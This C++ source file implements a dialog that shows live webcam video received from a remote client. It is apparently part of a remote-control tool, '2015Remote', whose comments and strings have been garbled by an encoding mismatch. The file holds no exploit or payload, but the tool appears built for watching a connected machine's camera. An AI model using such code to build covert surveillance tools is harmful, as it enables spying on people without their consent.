// VideoDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "VideoDlg.h"
#include "afxdialogex.h"


enum
{
	IDM_SAVEAVI,					// ����¼��
};
// CVideoDlg �Ի���

IMPLEMENT_DYNAMIC(CVideoDlg, CDialog)

CVideoDlg::CVideoDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(CVideoDlg::IDD, pParent)
{
	m_ContextObject = ContextObject;
	m_iocpServer = IOCPServer;
	m_BitmapInfor_Full = NULL;
	m_pVideoCodec      = NULL;     //�������ǳ�ʼ����    �ҿ�
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int iClientAddressLength = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&ClientAddress, &iClientAddressLength);
	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";


	ResetScreen();


}


void CVideoDlg::ResetScreen(void)
{
	if (m_BitmapInfor_Full)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}


	int	iBitMapInforSize = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;  
	m_BitmapInfor_Full	= (LPBITMAPINFO) new BYTE[iBitMapInforSize];
	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), iBitMapInforSize); 


	m_BitmapData_Full	= new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
	m_BitmapCompressedData_Full	= new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage];
}

CVideoDlg::~CVideoDlg()
{
}

void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
END_MESSAGE_MAP()


// CVideoDlg ��Ϣ�������


BOOL CVideoDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{


		m_hDD = DrawDibOpen();

		m_hDC = ::GetDC(m_hWnd);

	
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "����¼��(&V)");
	

		CString strString;

		strString.Format("��Ƶ���� - \\\\%s %d �� %d", m_strIPAddress, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);

		SetWindowText(strString);


		BYTE bToken = COMMAND_NEXT;

		m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
	}



	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CVideoDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ

	CDialog::OnClose();
}



void CVideoDlg::OnReceiveComplete(void)
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:   //   
		{

			DrawDIB();//�����ǻ�ͼ������ת�����Ĵ��뿴һ��
			break;
		}
	default:
		// ���䷢���쳣����
		break;
	}
}





void CVideoDlg::DrawDIB(void)
{
	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu == NULL)
		return;

	int		nHeadLen = 1 + 1 + 4;       

	LPBYTE	szBuffer = m_ContextObject->InDeCompressedBuffer.GetBuffer();
	UINT	ulBufferLen = m_ContextObject->InDeCompressedBuffer.GetBufferLength();
	if (szBuffer[1] == 0) // û�о���H263ѹ����ԭʼ���ݣ�����Ҫ����
	{
		// ��һ�Σ�û��ѹ����˵������˲�֧��ָ���Ľ�����
	/*	if (m_nCount == 1)
		{
			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);*/
	}

	else // ����
	{
		////���ﻺ������ĵĵڶ����ַ��������Ƿ���Ƶ���� 
		InitCodec(*(LPDWORD)(szBuffer + 2)); //�ж�       
		if (m_pVideoCodec != NULL)
		{
			//pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_BitmapCompressedData_Full, szBuffer + nHeadLen, ulBufferLen - nHeadLen);   //��Ƶû�н�ѹ
			//���￪ʼ���룬��������ͬδѹ����һ���� ��ʾ���Ի����ϡ� ��������ʼ��Ƶ�����avi��ʽ
			m_pVideoCodec->DecodeVideoData(m_BitmapCompressedData_Full, ulBufferLen - nHeadLen, 
				(LPBYTE)m_BitmapData_Full, NULL,  NULL);  //����Ƶ���ݽ�ѹ��m_lpScreenDIB


		/*	m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
				(LPBYTE)m_lpScreenDIB, NULL,  NULL);  //����Ƶ���ݽ�ѹ��m_lpScreenDIB*/
		}
	}

	PostMessage(WM_PAINT);

}


void CVideoDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_BitmapInfor_Full, fccHandler))     //�������˸�ʽ ƥ����
	{

	}

}


void CVideoDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ


	switch (nID)
	{
	case IDM_SAVEAVI:
		{
			//SaveAvi();
			break;
		}

	}

	CDialog::OnSysCommand(nID, lParam);
}


void CVideoDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	
	if (m_BitmapData_Full==NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);


	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_BitmapInfor_Full,
		m_BitmapData_Full,
		0, 0,
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

}
